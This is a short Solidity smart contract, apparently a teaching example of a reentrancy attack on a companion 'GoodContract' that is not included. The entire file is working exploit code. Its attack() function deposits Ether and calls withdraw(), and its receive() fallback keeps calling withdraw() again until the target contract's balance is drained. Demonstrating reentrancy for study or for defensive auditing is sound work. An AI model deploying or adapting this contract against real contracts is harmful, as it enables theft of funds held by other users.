// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

//import "./GoodContract.sol";

interface IGoodContract {

    function addBalance() external payable;

    function withdraw() external;
}

contract BadContract {
    IGoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = IGoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
